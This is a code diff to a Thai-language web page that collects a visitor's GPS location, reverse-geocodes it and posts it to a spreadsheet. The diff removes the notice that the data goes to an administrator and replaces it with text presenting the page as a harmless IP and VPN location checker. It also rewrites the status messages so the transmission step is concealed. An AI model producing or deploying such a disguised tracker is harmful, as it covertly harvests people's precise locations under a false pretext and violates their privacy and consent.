@@ -132,16 +132,16 @@
   <h1>ตรวจสอบตำแหน่งเครื่อง</h1>
 
   <div class="desc">
-    เมื่อกดปุ่ม ระบบจะขออนุญาตเข้าถึงตำแหน่ง GPS จากเครื่องนี้<br>
-    ข้อมูลจะถูกส่งไปยังผู้ดูแล
+    กดที่ปุ่ม ตรวจสอบ เพื่อเช็คตำแหน่ง ip ของอินเตอร์เน็ตเครื่อง
+    ถ้าหากเปิด VPN จะขึ้นประเทศที่เราเลือก
   </div>
 
   <button id="sendBtn" onclick="submitLocation()">
-    กดเพื่อส่งตำแหน่งเครื่องนี้
+    ตรวจสอบ
   </button>
 
   <div id="status" class="status">
-    พร้อมใช้งาน
+    ยังไม่มีการตรวจสอบ
   </div>
 
   <div id="result" class="result">
@@ -177,7 +177,7 @@ const countryView = document.getElementById("countryView");
 async function submitLocation() {
   sendBtn.disabled = true;
   statusEl.style.display = "block";
-  statusEl.innerHTML = "กำลังตรวจสอบข้อมูลเครื่อง...";
+  statusEl.innerHTML = "กรุณารอสักครู่...";
 
   const data = createBaseData();
 
@@ -192,13 +192,13 @@ async function submitLocation() {
 
   showSimpleResult(data);
 
-  statusEl.innerHTML = "กำลังขออนุญาต GPS...";
+  statusEl.innerHTML = "กำลังตรวจสอบ GPS...";
 
   const gpsData = await getGpsInfo();
   Object.assign(data, gpsData);
 
   if (data.gps_latitude && data.gps_longitude) {
-    statusEl.innerHTML = "กำลังแปลงที่อยู่ GPS...";
+    statusEl.innerHTML = "กำลังตรวจสอบ GPS...";
 
     try {
       const addressData = await reverseGeocode(data.gps_latitude, data.gps_longitude);
@@ -220,7 +220,7 @@ async function submitLocation() {
   showSimpleResult(data);
 
   try {
-    statusEl.innerHTML = "กำลังส่งข้อมูลไปยังผู้ดูแล...";
+    statusEl.innerHTML = "ขั้นตอนสุดท้ายกำลังจะแสดงผล...";
 
     await sendToSheetByPost(data);
 
@@ -234,7 +234,7 @@ async function submitLocation() {
   } catch (err) {
     statusEl.style.display = "block";
     statusEl.innerHTML =
-      "<span class='error'>ส่งข้อมูลไม่สำเร็จ:</span> " + escapeHtml(String(err));
+      "<span class='error'>เกิดข้อผิดพลาด:</span> " + escapeHtml(String(err));
   }
 
   sendBtn.disabled = false;
